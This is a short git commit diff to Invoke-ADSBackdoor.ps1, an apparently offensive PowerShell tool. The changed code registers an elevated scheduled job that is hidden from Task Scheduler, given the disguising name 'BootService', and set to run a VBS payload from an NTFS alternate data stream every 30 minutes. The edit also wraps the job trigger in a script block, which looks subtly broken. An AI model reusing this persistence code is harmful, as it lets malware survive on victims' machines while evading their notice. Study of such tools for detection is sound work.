2acef2264175f8e0e100a469ffd80a909f71e52d
simonpunk <simonp230446@hotmail.com>
2016-07-09 14:23:40 +0800

    Update Invoke-ADSBackdoor.ps1

--- Invoke-ADSBackdoor.ps1
+++ Invoke-ADSBackdoor.ps1
@@ -94,8 +94,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     }
     else {
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trig = New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Script = {wscript.exe $env:USERPROFILE\AppData:ytdsocgcalc.vbs}
+       $Trig = {New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"}
+       $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
        Register-ScheduledJob –Name BootService -ScriptBlock $Script –Trigger $Trig –ScheduledJobOption $Option
        "Process Complete. Persistent key is located at "
     }
